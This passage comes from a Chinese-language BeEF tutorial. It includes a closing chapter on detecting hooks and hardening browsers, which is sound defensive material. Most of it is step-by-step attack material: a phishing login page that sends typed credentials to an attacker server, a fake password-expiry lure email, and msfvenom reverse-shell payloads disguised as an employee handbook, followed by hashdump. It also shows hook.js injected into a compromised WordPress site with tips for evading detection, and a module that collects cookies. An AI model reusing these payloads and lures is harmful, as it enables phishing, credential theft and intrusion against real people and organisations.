            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        .login-btn:hover {
            opacity: 0.9;
        }
        .links {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }
        .links a {
            color: #667eea;
            text-decoration: none;
            margin: 0 10px;
        }
        .error-msg {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>XX科技企业邮箱</h1>
            <p>Enterprise Email System</p>
        </div>
        <form id="loginForm" onsubmit="return handleLogin(event)">
            <div class="form-group">
                <label for="email">邮箱账号</label>
                <input type="text" id="email" name="email" placeholder="请输入您的企业邮箱" required>
            </div>
            <div class="form-group">
                <label for="password">密码</label>
                <input type="password" id="password" name="password" placeholder="请输入密码" required>
                <div class="error-msg" id="errorMsg">账号或密码错误，请重试</div>
            </div>
            <button type="submit" class="login-btn">登 录</button>
        </form>
        <div class="links">
            <a href="#">忘记密码</a>
            <a href="#">注册新账号</a>
        </div>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            // 发送凭证到BeEF服务器（通过模块回调或自定义接口）
            var img = new Image();
            img.src = 'http://192.168.1.100:3000/demo/creds?email=' + 
                      encodeURIComponent(email) + '&password=' + encodeURIComponent(password);

            // 显示错误提示，诱导用户重试
            document.getElementById('errorMsg').style.display = 'block';

            // 同时，用户的浏览器已经被BeEF Hook，可以执行更多模块
            return false;
        }
    </script>
</body>
</html>
```

**步骤二：部署钓鱼页面**

```bash
# 复制到Web服务器目录
cp phishing.html /var/www/html/
service apache2 start
```

**步骤三：发送钓鱼邮件**

使用社会工程学手段，向目标发送钓鱼邮件：

```
主题：【重要通知】您的企业邮箱密码即将过期

尊敬的员工：

您好！
系统检测到您的企业邮箱密码将于24小时后过期。
为避免影响您的正常工作，请尽快点击以下链接更新密码：

http://192.168.1.100/phishing.html

如有疑问，请联系IT部门。

XX科技 IT部门
```

**步骤四：等待受害者上钩**

当受害者点击链接并输入凭证时：
1. 浏览器加载Hook.js，建立BeEF连接
2. 用户输入的账号密码被发送到BeEF服务器
3. 页面显示"账号或密码错误"，诱导用户重试（可获取更多信息）

**步骤五：获取凭证和浏览器控制**

1. **凭证获取**：在BeEF服务器日志或自定义接口中查看窃取的凭证
2. **浏览器控制**：在BeEF管理界面中对Hook的浏览器执行进一步操作

**步骤六：使用Pretty Theft模块（进阶）**

如果受害者已经在浏览其他页面，也可以直接使用BeEF的Pretty Theft模块弹出钓鱼窗口：

1. 选中Hook的浏览器
2. 展开 "Social Engineering" -> "Pretty Theft"
3. 选择合适的模板（或自定义）
4. 配置回调URL接收凭证
5. 点击"Execute"

> **截图位置说明**：目标浏览器页面中央弹出一个半透明遮罩的登录对话框，与真实企业邮箱登录界面高度相似。用户可能难以分辨真伪。

#### 案例总结

本案例展示了钓鱼攻击与BeEF的结合使用。传统的钓鱼攻击只能获取用户输入的凭证，而结合BeEF后，攻击者还能获得对浏览器的完整控制权，可以进行更深入的渗透。

### 6.3 案例3：内网渗透——从浏览器Hook到内网访问

#### 场景描述

通过社会工程学手段Hook了一名员工的浏览器，利用该浏览器作为跳板，探测公司内网环境，发现内部系统漏洞。

#### 实验环境

| 角色 | 操作系统 | IP地址 | 说明 |
|------|---------|--------|------|
| BeEF服务器 | Kali Linux | 公网IP x.x.x.x | 部署在公网 |
| 受害者 | Windows 10 | 192.168.10.50 | 公司内网员工电脑 |
| 内网服务器1 | Windows Server | 192.168.10.10 | 域控/DNS |
| 内网服务器2 | Linux | 192.168.10.20 | Web服务器 |
| 内网服务器3 | Linux | 192.168.10.30 | 数据库服务器 |

#### 攻击步骤

**步骤一：获取内网IP**

1. Hook目标浏览器
2. 执行 "Network" -> "Host" -> "Get Internal IP WebRTC"
3. 获得内网IP：`192.168.10.50`

> **截图位置说明**：模块执行结果显示Internal IP为192.168.10.50，确认目标处于192.168.10.0/24网段。

**步骤二：内网主机发现**

执行Ping Sweep扫描内网存活主机：

1. 展开 "Network" -> "Host" -> "Ping Sweep"
2. 设置 `cidr` 为 `192.168.10.0/24`
3. 设置 `timeout` 为 `1500`
4. 点击"Execute"

扫描结果可能显示：
```
192.168.10.1 - 网关/路由器
192.168.10.10 - 存活
192.168.10.20 - 存活
192.168.10.30 - 存活
192.168.10.50 - 本机
192.168.10.100 - 存活
```

> **截图位置说明**：Ping Sweep执行结果显示扫描到的存活主机列表，每个IP地址后面标注响应时间和状态。

**步骤三：端口扫描**

对发现的内网主机进行端口扫描：

1. 展开 "Network" -> "Port Scanner"
2. 设置 `ip` 为 `192.168.10.20`
3. 设置 `ports` 为 `21,22,80,443,3306,8080`
4. 点击"Execute"

假设扫描结果：
- 192.168.10.20:80 - 开放（HTTP）
- 192.168.10.20:22 - 开放（SSH）
- 192.168.10.10:53 - 开放（DNS）
- 192.168.10.30:3306 - 开放（MySQL）

**步骤四：内网Web服务探测**

对内网Web服务进行进一步探测：

1. 展开 "Network" -> "Cross-Origin Scanner"
2. 配置目标URL列表：
   ```
   http://192.168.10.20/
   http://192.168.10.20/admin
   http://192.168.10.20/phpmyadmin
   http://192.168.10.1:8080/
   ```
3. 点击"Execute"

**步骤五：DNS枚举**

探测内网域名：

1. 展开 "Network" -> "DNS" -> "Enumerate Hostnames"
2. 设置 `domain` 为 `corp.local`
3. 点击"Execute"

可能发现：
- dc.corp.local
- web.corp.local
- db.corp.local
- mail.corp.local

**步骤六：利用Rider进行请求骑乘**

BeEF的Rider功能可以通过Hooked浏览器向任意URL发送HTTP请求，并获取响应内容（受同源策略限制，但可以用于CSRF等攻击）。

1. 切换到"Rider"标签页
2. 输入目标URL：`http://192.168.10.20/admin`
3. 选择请求方法：GET/POST
4. 点击"Send Request"

> **截图位置说明**：Rider界面分为请求配置区和响应显示区。请求配置区可以设置URL、方法、头部、请求体等。响应区显示返回的状态码、响应头和响应体。

**步骤七：内网横向移动思路**

基于收集到的信息，可以规划进一步的内网渗透：

1. 如果内网Web应用存在漏洞，可通过Hooked浏览器进行利用
2. 如果发现弱密码的管理界面，可尝试登录
3. 配合Metasploit进行浏览器到系统的权限提升
4. 使用社会工程模块获取更高权限的凭证

#### 案例总结

本案例展示了BeEF在内网渗透中的独特价值。即使攻击者无法直接访问目标内网，只要Hook了内网中的一台浏览器，就可以将其作为跳板进行内网侦察，为后续的深度渗透打下基础。

### 6.4 案例4：配合社会工程学获取系统权限

#### 场景描述

通过BeEF的社会工程模块，诱导用户下载并执行恶意程序，从浏览器权限提升为系统权限。

#### 实验环境

| 角色 | 操作系统 | IP地址 | 软件 |
|------|---------|--------|------|
| BeEF + MSF服务器 | Kali Linux | 192.168.1.100 | BeEF + Metasploit |
| 受害者 | Windows 10 | 192.168.1.50 | Chrome + Office |

#### 攻击步骤

**步骤一：生成恶意Payload**

使用Metasploit生成恶意可执行文件：

```bash
# 生成Windows反向TCP Payload
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=4444 \
    -f exe \
    -o /var/www/html/update.exe

# 或者伪装成Office文档（利用社工程学）
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=4444 \
    -f exe \
    -o /var/www/html/员工手册v2.0.exe
```

**步骤二：启动Metasploit监听**

```bash
msfconsole
msf> use exploit/multi/handler
msf exploit(handler)> set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler)> set LHOST 192.168.1.100
msf exploit(handler)> set LPORT 4444
msf exploit(handler)> exploit -j
```

**步骤三：Hook目标浏览器**

通过XSS、钓鱼或其他方式Hook目标浏览器。

**步骤四：使用社会工程模块诱导下载**

**方法一：Fake Notification Bar**

1. 选中目标浏览器
2. 展开 "Social Engineering" -> "Fake Notification Bar"
3. 选择 `type` 为 `Custom`
4. 配置文本："检测到您的Office版本需要更新，点击安装最新安全补丁"
5. 配置下载链接：`http://192.168.1.100/员工手册v2.0.exe`
6. 点击"Execute"

**方法二：Clippy助手**

1. 展开 "Social Engineering" -> "Clippy"
2. 设置 `message` 为："您好！我是您的办公助手。检测到您有新的员工手册需要查看，点击下载："
3. 设置 `executable` 为：`http://192.168.1.100/员工手册v2.0.exe`
4. 设置 `clippy_id` 为：`Merlin`（魔术师形象）
5. 点击"Execute"

> **截图位置说明**：目标浏览器页面右下角出现一个可爱的魔术师助手动画，上方有对话气泡显示提示信息，下方有"下载"按钮。

**方法三：页面内容替换+下载提示**

1. 使用 "Replace Content" 模块修改页面内容
2. 添加"系统维护通知"，附带下载链接
3. 诱导用户点击下载

**步骤五：等待用户执行**

用户下载并运行恶意程序后：
1. Payload在目标系统上执行
2. 反向连接到Metasploit监听器
3. 获得Meterpreter会话

**步骤六：获取系统Shell**

```bash
# 在msfconsole中查看会话
msf> sessions -l

# 进入会话
msf> sessions -i 1

# 查看系统信息
meterpreter> sysinfo

# 获取更多权限
meterpreter> getsystem

# 转储密码哈希
meterpreter> hashdump
```

> **截图位置说明**：Meterpreter会话成功建立，显示目标系统信息（操作系统、计算机名、架构等），可以执行各种后渗透命令。

#### 案例总结

本案例展示了从浏览器Hook到系统权限的完整攻击链。BeEF的社会工程模块在其中扮演了关键角色——通过精心设计的欺骗手段，诱导用户主动执行恶意程序，从而突破浏览器沙箱限制，获取系统级权限。

### 6.5 案例5：水坑攻击完整流程

#### 场景描述

针对特定目标群体（如某公司员工），攻陷他们经常访问的行业论坛，植入BeEF Hook，等待目标上钩。

#### 实验环境

| 角色 | 操作系统 | IP地址 | 说明 |
|------|---------|--------|------|
| BeEF服务器 | Kali Linux | 公网IP x.x.x.x | 部署在公网 |
| 目标网站 | CentOS | 公网IP y.y.y.y | 行业论坛（被攻陷） |
| 目标用户 | Windows 10 | 动态IP | 公司员工 |

#### 攻击步骤

**步骤一：信息收集与目标选择**

1. 确定目标公司和员工群体
2. 通过社交网络、论坛等渠道了解他们常访问的网站
3. 选择一个访问量较大、安全性较低的网站作为"水坑"

**步骤二：攻陷水坑网站**

使用各种手段获取目标网站的控制权：
- 利用已知CMS漏洞（WordPress、Discuz!等）
- 暴力破解后台密码
- SQL注入获取管理员权限
- 社会工程获取FTP/SSH凭证

> **注意**：未经授权攻陷他人网站是违法行为，本步骤仅在授权测试中进行。

**步骤三：植入BeEF Hook**

在网站的公共页面中注入Hook脚本。以WordPress为例：

```php
// 在主题的header.php中添加
<script src="http://beef-server.com:3000/hook.js"></script>

// 或者更隐蔽的方式
<script>
(function(){
    var s = document.createElement('script');
    s.src = 'http://beef-server.com:3000/hook.js';
    s.async = true;
    (document.head || document.documentElement).appendChild(s);
})();
</script>
```

**隐蔽技巧：**
1. 将Hook脚本伪装成统计代码或第三方脚本
2. 仅对特定IP段的访问者注入Hook
3. 对搜索引擎爬虫不注入（避免被发现）
4. 使用HTTPS + 可信域名降低被检测概率

**步骤四：等待目标上钩**

部署完成后，耐心等待目标用户访问被攻陷的网站。可以通过以下方式加速：
- 在目标聚集的社区发布相关话题
- 发送相关资讯邮件（不含直接恶意链接）
- 利用SEO优化提升网站排名

**步骤五：目标识别与筛选**

当有浏览器被Hook后，根据信息筛选目标：

1. **公网IP**：判断是否属于目标公司IP段
2. **User-Agent**：判断是否为公司标准配置的浏览器
3. **系统信息**：判断是否为公司配发的设备
4. **Cookie信息**：识别已登录的账号
5. **内网IP**：判断内网网段

> **截图位置说明**：BeEF管理界面的左栏列出了所有被Hook的浏览器。可以通过IP地址、浏览器类型、操作系统等信息进行筛选，找出属于目标公司的浏览器。

**步骤六：针对目标执行攻击**

对筛选出的目标浏览器执行定制化攻击：

1. **信息收集阶段**
   - 完整浏览器指纹
   - 内网IP和网段
   - 已登录的网站（通过Cookie判断）
   - 系统信息和软件版本

2. **内网侦察阶段**
   - Ping扫描内网网段
   - 端口扫描关键服务器
   - DNS枚举内部域名

3. **凭证获取阶段**
   - 针对公司邮箱使用Pretty Theft
   - 针对内部系统使用定制钓鱼
   - 收集浏览器保存的密码

4. **权限提升阶段**
   - 配合Metasploit投递Payload
   - 利用社会工程诱导执行
   - 寻找浏览器插件漏洞

**步骤七：扩大战果**

- 利用获取的凭证访问内部系统
- 通过内网访问进一步渗透
- 建立持久化访问通道
- 横向移动到其他系统

#### 案例总结

水坑攻击是一种高级的社会工程+技术攻击组合。相比直接钓鱼，水坑攻击的隐蔽性更强，可信度更高，因为目标访问的是他们自己信任的网站。BeEF在其中扮演了核心角色——它将一次性的网站访问转化为持久的浏览器控制，为后续攻击提供了稳定的立足点。

---

## 第7章 BeEF扩展开发

BeEF是一个高度可扩展的框架，支持自定义模块的开发。本章介绍BeEF的模块架构和开发方法。

### 7.1 BeEF模块架构

#### 模块目录结构

BeEF的模块位于 `modules/` 目录下，按功能类别组织：

```
modules/
├── browser/           # 浏览器相关模块
│   ├── fingerprint/   # 指纹识别
│   ├── hooked_dom/    # Hook域操作
│   └── ...
├── network/           # 网络模块
│   ├── host/          # 主机发现
│   ├── dns/           # DNS探测
│   └── port_scanner/  # 端口扫描
├── social_engineering/ # 社会工程模块
├── persistence/       # 持久化模块
├── metasploit/        # Metasploit集成
└── ...
```

#### 单个模块的结构

每个模块是一个独立的目录，包含以下文件：

```
module_name/
├── module.rb          # 模块定义（Ruby，服务端）
├── command.js         # 客户端执行代码（JavaScript）
├── description.txt    # 模块描述
└── [其他资源文件]     # HTML、CSS、图片等
```

**文件说明：**

| 文件 | 必需 | 说明 |
|------|------|------|
| module.rb | 是 | 模块的核心定义文件，包含模块元数据和服务端逻辑 |
| command.js | 是 | 在目标浏览器中执行的JavaScript代码 |
| description.txt | 否 | 模块的详细描述文本 |
| 其他资源 | 否 | 模块需要的额外资源文件 |

#### 模块生命周期

1. **加载阶段**：BeEF启动时扫描模块目录，解析module.rb注册模块
2. **选择阶段**：管理员在界面中选择要执行的模块
3. **下发阶段**：BeEF服务器将command.js发送给Hooked浏览器
4. **执行阶段**：浏览器执行JavaScript代码
5. **结果阶段**：执行结果回传到服务器，显示在管理界面

### 7.2 命令模块开发（Ruby）

#### module.rb基本结构

```ruby
#
# 模块名称：示例模块
# 作者：Your Name
# 版本：1.0
# 描述：这是一个示例BeEF模块
#

class Example_module < BeEF::Core::Command

  def self.options
    # 定义模块参数
    return [
      {
        'name' => 'somename',           # 参数名称
        'description' => '参数描述',    # 参数描述
        'ui_label' => '界面显示名称',   # 管理界面显示的标签
        'value' => 'default_value'      # 默认值
      }
    ]
  end

  def post_execute
    # 命令执行后的处理逻辑
    content = {}
    content['result'] = @datastore['result']
    save content
  end

end
```

#### 模块类的核心方法

| 方法 | 说明 |
|------|------|
| `self.options` | 定义模块的配置参数，显示在管理界面中 |
| `pre_send` | 命令发送前执行的逻辑（服务端） |
| `post_execute` | 命令执行完成后执行的逻辑（服务端），处理返回结果 |
| `callback` | 可选的回调处理函数 |

#### 完整的模块示例

```ruby
#
# Browser Info Collector - 自定义浏览器信息收集模块
#

class Browser_info_collector < BeEF::Core::Command

  def self.options
    [
      {
        'name' => 'collect_canvas',
        'type' => 'checkbox',
        'ui_label' => '收集Canvas指纹',
        'value' => 'true'
      },
      {
        'name' => 'collect_plugins',
        'type' => 'checkbox',
        'ui_label' => '收集插件列表',
        'value' => 'true'
      },
      {
        'name' => 'custom_js',
        'type' => 'textarea',
        'ui_label' => '自定义JavaScript',
        'value' => ''
      }
    ]
  end

  def pre_send
    # 命令发送前可以在这里做一些准备工作
    # 例如：根据配置动态生成JavaScript代码
    BeEF::Core::Logger.instance.register('Module', 
      "Browser Info Collector 模块已发送给 #{@datastore['zombie_id']}")
  end

  def post_execute
    content = {}
    
    # 处理返回的数据
    if @datastore['result']
      begin
        data = JSON.parse(@datastore['result'])
        content['user_agent'] = data['userAgent']
        content['screen_size'] = "#{data['screenWidth']}x#{data['screenHeight']}"
        content['language'] = data['language']
        content['platform'] = data['platform']
        content['cookie_count'] = data['cookieCount']
        content['localstorage_count'] = data['localStorageCount']
        
        if data['canvasFingerprint']
          content['canvas_fingerprint'] = data['canvasFingerprint']
        end
        
        if data['plugins']
          content['plugins'] = data['plugins'].join(', ')
        end
        
      rescue => e
        content['error'] = "解析结果失败: #{e.message}"
      end
    end
    
    save content
  end

end
```

### 7.3 客户端代码（JavaScript）

#### command.js基本结构

```javascript
// 自定义浏览器信息收集模块
beef.execute(function() {
    
    var result = {};
    
    // 收集基本信息
    result.userAgent = navigator.userAgent;
    result.platform = navigator.platform;
    result.language = navigator.language || navigator.browserLanguage;
    result.screenWidth = screen.width;
    result.screenHeight = screen.height;
    result.colorDepth = screen.colorDepth;
    
    // 收集Cookie信息
    result.cookieCount = document.cookie ? document.cookie.split(';').length : 0;
    result.cookies = document.cookie;
    
    // 收集LocalStorage信息
    try {
        result.localStorageCount = localStorage.length;
    } catch(e) {
        result.localStorageCount = 0;
    }
    
    // 收集插件信息
    result.plugins = [];
    if (navigator.plugins && navigator.plugins.length > 0) {
        for (var i = 0; i < navigator.plugins.length; i++) {
            result.plugins.push(navigator.plugins[i].name);
        }
    }
    
    // 收集Canvas指纹
    if (beef.net.evaluate("somename") == 'true') {
        try {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('beef-canvas-fingerprint-<canvas>', 2, 2);
            result.canvasFingerprint = canvas.toDataURL().substring(0, 100) + '...';
        } catch(e) {
            result.canvasFingerprint = 'not_supported';
        }
    }
    
    // 执行自定义JS
    var customJs = beef.net.evaluate("custom_js");
    if (customJs && customJs.length > 0) {
        try {
            result.customResult = eval(customJs);
        } catch(e) {
            result.customResult = 'Error: ' + e.message;
        }
    }
    
    // 返回结果给BeEF服务器
    beef.net.send('/command/' + beef.command_session_id, 
        beef.command_id, JSON.stringify(result));
    
});
```

#### BeEF客户端API

在command.js中可以使用以下BeEF API：

| API | 说明 |
|-----|------|
| `beef.execute(callback)` | 执行模块代码的标准包装函数 |
| `beef.net.evaluate(param_name)` | 获取模块配置参数的值 |
| `beef.net.send(url, cmd_id, data)` | 向服务器发送数据 |
| `beef.dom` | DOM操作工具函数 |
| `beef.browser` | 浏览器检测相关函数 |
| `beef.net.request(url, callback, method, data)` | 发送HTTP请求 |
| `beef.cookie.get(name)` | 获取Cookie |
| `beef.cookie.set(name, value, days)` | 设置Cookie |

#### 复杂模块示例：自定义弹窗

```javascript
// 自定义社会工程弹窗模块
beef.execute(function() {
    
    // 获取配置参数
    var title = beef.net.evaluate("title") || "系统提示";
    var message = beef.net.evaluate("message") || "请更新您的浏览器";
    var buttonText = beef.net.evaluate("button_text") || "立即更新";
    var downloadUrl = beef.net.evaluate("download_url") || "#";
    
    // 创建弹窗HTML
    var modalHtml = `
        <div id="beef-custom-modal" style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 99999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        ">
            <div style="
                background: white;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                max-width: 400px;
                width: 90%;
            ">
                <h3 style="margin-top:0;color:#333;">${title}</h3>
                <p style="color:#666;line-height:1.6;">${message}</p>
                <div style="margin-top:20px;text-align:right;">
                    <button id="beef-modal-cancel" style="
                        padding: 8px 20px;
                        margin-right: 10px;
                        border: 1px solid #ddd;
                        background: #f5f5f5;
                        border-radius: 4px;
                        cursor: pointer;
                    ">取消</button>
                    <button id="beef-modal-ok" style="
                        padding: 8px 20px;
                        background: #007bff;
                        color: white;
                        border: none;
                        border-radius: 4px;
                        cursor: pointer;
                    ">${buttonText}</button>
                </div>
            </div>
        </div>
    `;
    
    // 插入到页面
    var modalDiv = document.createElement('div');
    modalDiv.innerHTML = modalHtml;
    document.body.appendChild(modalDiv);
    
    // 绑定事件
    document.getElementById('beef-modal-ok').onclick = function() {
        // 用户点击了确认按钮
        beef.net.send('/command/' + beef.command_session_id, 
            beef.command_id, JSON.stringify({
                'status': 'clicked',
                'action': 'download',
                'url': downloadUrl
            }));
        
        // 触发下载
        window.location.href = downloadUrl;
        
        // 关闭弹窗
        document.getElementById('beef-custom-modal').style.display = 'none';
    };
    
    document.getElementById('beef-modal-cancel').onclick = function() {
        // 用户取消
        beef.net.send('/command/' + beef.command_session_id, 
            beef.command_id, JSON.stringify({
                'status': 'cancelled'
            }));
        
        document.getElementById('beef-custom-modal').style.display = 'none';
    };
    
    // 通知服务器弹窗已显示
    beef.net.send('/command/' + beef.command_session_id, 
        beef.command_id, JSON.stringify({
            'status': 'displayed'
        }));
    
});
```

### 7.4 模块配置与注册

#### 模块的配置文件

除了module.rb中定义的选项，还可以通过配置文件控制模块的行为：

```yaml
# 在config.yaml中配置模块
modules:
  path: ['modules']
  disable: []
  autoload: true
  
  # 特定模块的配置
  browser_info_collector:
    enabled: true
    category: 'browser/fingerprint'
```

#### 模块的分类与显示

模块在管理界面中的显示位置由其目录结构决定。例如：
- `modules/browser/fingerprint/your_module/` → Browser → Fingerprint → Your Module
- `modules/social_engineering/your_module/` → Social Engineering → Your Module

#### 模块兼容性设置

在module.rb中可以设置模块的目标浏览器兼容性：

```ruby
class My_module < BeEF::Core::Command

  # 支持的浏览器
  def self.supported_browsers
    {
      'ALL' => 'all'    # 支持所有浏览器
      # 或者指定特定版本：
      # 'FF' => ['3.0', '4.0', '5.0+']
      # 'S'  => ['5.0+']
      # 'C'  => ['10+']
      # 'IE' => ['8.0', '9.0', '10.0+']
    }
  end

end
```

### 7.5 自定义模块开发实战

让我们从头开始开发一个完整的BeEF模块：**页面暗模式切换器**（一个简单但实用的示例）。

#### 步骤一：创建模块目录

```bash
cd /path/to/beef/modules/browser/
mkdir dark_mode_toggle
cd dark_mode_toggle
```

#### 步骤二：创建module.rb

```ruby
#
# Dark Mode Toggle
# 切换页面为暗色模式
#

class Dark_mode_toggle < BeEF::Core::Command

  def self.options
    [
      {
        'name' => 'mode',
        'type' => 'combobox',
        'ui_label' => '显示模式',
        'store_type' => 'arraystore',
        'store_fields' => ['mode'],
        'store_data' => [
          ['dark'],
          ['light'],
          ['invert']
        ],
        'value' => 'dark',
        'valueField' => 'mode',
        'displayField' => 'mode'
      },
      {
        'name' => 'transition',
        'type' => 'checkbox',
        'ui_label' => '启用过渡动画',
        'value' => 'true'
      }
    ]
  end

  def post_execute
    content = {}
    content['status'] = @datastore['status'] || 'unknown'
    content['mode'] = @datastore['mode']
    save content
  end

end
```

#### 步骤三：创建command.js

```javascript
// Dark Mode Toggle Module
beef.execute(function() {
    
    var mode = beef.net.evaluate("mode") || "dark";
    var transition = beef.net.evaluate("transition") == "true";
    
    var result = {
        mode: mode,
        status: 'success'
    };
    
    try {
        // 添加样式
        var styleId = 'beef-dark-mode-style';
        var existingStyle = document.getElementById(styleId);
        
        if (existingStyle) {
            existingStyle.remove();
        }
        
        var style = document.createElement('style');
        style.id = styleId;
        
        var css = '';
        
        if (mode === 'dark') {
            css = `
                html {
                    filter: invert(1) hue-rotate(180deg) !important;
                    ${transition ? 'transition: filter 0.5s ease;' : ''}
                }
                img, video, canvas, svg {
                    filter: invert(1) hue-rotate(180deg) !important;
                }
            `;
        } else if (mode === 'light') {
            // 恢复正常（移除样式即可）
            result.message = '已恢复亮色模式';
        } else if (mode === 'invert') {
            css = `
                html {
                    filter: invert(1) !important;
                    ${transition ? 'transition: filter 0.5s ease;' : ''}
                }
            `;
        }
        
        if (css.length > 0) {
            style.appendChild(document.createTextNode(css));
            document.head.appendChild(style);
        }
        
        result.applied = true;
        
    } catch(e) {
        result.status = 'error';
        result.error = e.message;
    }
    
    // 返回结果
    beef.net.send('/command/' + beef.command_session_id, 
        beef.command_id, JSON.stringify(result));
    
});
```

#### 步骤四：创建description.txt

```
Dark Mode Toggle
================

此模块可以将被Hook的浏览器页面切换为暗色模式或反色模式。

使用场景：
- 测试页面的可访问性
- 干扰用户正常浏览
- 隐藏Hook痕迹（用户以为是显示问题）

支持的模式：
- dark: 暗色模式（反转颜色并旋转色相）
- light: 亮色模式（恢复正常）
- invert: 完全反色
```

#### 步骤五：重启BeEF加载模块

```bash
# 重启BeEF
./beef -x
```

启动后，在模块树的 "Browser" 分类下应该能看到新的 "Dark Mode Toggle" 模块。

#### 步骤六：测试模块

1. Hook一个测试浏览器
2. 找到 "Dark Mode Toggle" 模块
3. 选择模式（dark/light/invert）
4. 点击"Execute"
5. 观察目标浏览器页面的变化

> **截图位置说明**：在Module Tree中找到自定义模块，配置参数后点击Execute。目标浏览器页面会应用对应的显示效果。在Commands标签页中可以看到执行结果和状态。

#### 模块开发注意事项

1. **兼容性**：考虑不同浏览器的API差异，做好特性检测
2. **错误处理**：JavaScript代码中加入try-catch，避免因错误导致Hook断开
3. **性能**：避免执行过于消耗资源的操作
4. **安全性**：对用户输入进行适当处理，避免模块本身被利用
5. **文档**：编写清晰的模块描述和使用说明
6. **测试**：在不同浏览器和系统中充分测试

---

## 第8章 检测与防御

了解BeEF的攻击原理后，掌握对应的检测和防御方法同样重要。本章从个人用户和企业两个层面，介绍BeEF Hook的检测与防御手段。

### 8.1 BeEF Hook的检测方法

#### 8.1.1 手动检测方法

**方法一：查看页面源代码**

最直接的检测方法是查看网页源代码，搜索可疑的脚本引用：

1. 在浏览器中按 `F12` 打开开发者工具
2. 切换到"Elements"或"查看器"标签
3. 搜索以下关键词：
   - `hook.js`
   - `beef`
   - `beefproject`
   - 可疑的第三方脚本域名
4. 检查所有 `<script>` 标签的src属性

> **截图位置说明**：在浏览器开发者工具的Elements面板中，可以看到页面的完整DOM结构。如果存在BeEF Hook，通常会在head或body末尾找到指向hook.js的script标签。

**方法二：检查网络请求**

通过浏览器的网络面板监控所有请求：

1. 按 `F12` 打开开发者工具
2. 切换到"Network"或"网络"标签
3. 刷新页面
4. 查找可疑的请求：
   - 向未知域名的请求
   - 请求路径包含 `hook.js`、`/hook`、`/beef`
   - 周期性的心跳请求（每2-5秒一次）
   - WebSocket连接（端口61985/61986）

**方法三：检查Cookie**

BeEF默认会在浏览器中设置名为 `BEEFHOOK` 的Cookie：

1. 按 `F12` 打开开发者工具
2. 切换到"Application"或"存储"标签
3. 查看Cookies
4. 查找名为 `BEEFHOOK` 的Cookie

**方法四：检查内存中的BeEF对象**

如果页面被BeEF Hook，通常会在全局作用域中存在 `beef` 对象：

1. 按 `F12` 打开开发者工具
2. 切换到"Console"或"控制台"标签
3. 输入 `window.beef` 并回车
4. 如果返回一个对象而非 `undefined`，说明可能被Hook了

#### 8.1.2 自动化检测工具

| 工具名称 | 类型 | 说明 |
|---------|------|------|
| NoScript | 浏览器扩展 | 阻止未经授权的脚本执行 |
| uBlock Origin | 浏览器扩展 | 广告/恶意脚本拦截 |
| Wappalyzer | 浏览器扩展 | 网站技术栈检测（可发现BeEF） |
| OWASP ZAP | 安全测试工具 | Web应用扫描器，可检测Hook |
| Burp Suite | 安全测试工具 | 代理工具，可检测可疑流量 |
| BeEF Detector | 在线工具 | 专门检测BeEF Hook的工具 |

#### 8.1.3 网络层面检测

**特征流量检测：**

BeEF通信具有以下特征：

1. **周期性心跳**：每2-5秒一次的HTTP POST请求
2. **固定URL路径**：`/hook`、`/command/`、`/init`
3. **特定User-Agent**：浏览器正常UA，但请求模式异常
4. **WebSocket连接**：端口61985（HTTP）/ 61986（HTTPS）
5. **响应头特征**：BeEF服务器有特定的响应头

**检测思路：**
- 监控内网主机是否有连接到可疑BeEF服务器的流量
- 检测周期性的异常POST请求
- 使用IDS/IPS配置BeEF特征规则

### 8.2 浏览器安全配置

#### 8.2.1 浏览器安全设置

**Chrome/Edge安全设置：**

1. **禁用JavaScript（高级用户）**
   - 设置 → 隐私和安全 → 网站设置 → JavaScript
   - 选择"不允许任何网站运行JavaScript"
   - 为可信网站添加例外

2. **阻止第三方Cookie**
   - 设置 → 隐私和安全 → Cookie和其他网站数据
   - 选择"阻止第三方Cookie"

3. **启用安全浏览**
   - 设置 → 隐私和安全 → 安全
   - 选择"增强保护"

4. **禁用WebRTC（防止IP泄露）**
   - 地址栏输入 `chrome://flags/#disable-webrtc`
   - 设置为"Enabled"（禁用WebRTC）
   - 或使用浏览器扩展

**Firefox安全设置：**

1. **增强跟踪保护**
   - 设置 → 隐私与安全 → 增强跟踪保护
   - 选择"严格"模式

2. **禁用WebRTC**
   - 地址栏输入 `about:config`
   - 搜索 `media.peerconnection.enabled`
   - 设置为 `false`

3. **限制JavaScript**
   - 地址栏输入 `about:config`
   - 搜索 `javascript.enabled`
   - 设置为 `false`（全局禁用）

#### 8.2.2 浏览器扩展防护

**推荐安装的安全扩展：**

1. **NoScript Security Suite**
   - 功能：白名单机制控制JavaScript执行
   - 效果：可完全阻止BeEF Hook执行
   - 适用：Firefox、Chrome（兼容版）

2. **uBlock Origin**
   - 功能：高效的广告和内容拦截器
   - 效果：可通过自定义规则拦截BeEF域名
   - 适用：所有主流浏览器

3. **Privacy Badger**
   - 功能：学习式隐私保护扩展
   - 效果：可阻止跟踪性脚本
   - 适用：Chrome、Firefox、Edge

4. **WebRTC Leak Prevent**
   - 功能：防止WebRTC泄露真实IP
   - 效果：阻止BeEF获取内网IP
   - 适用：Chrome、Edge

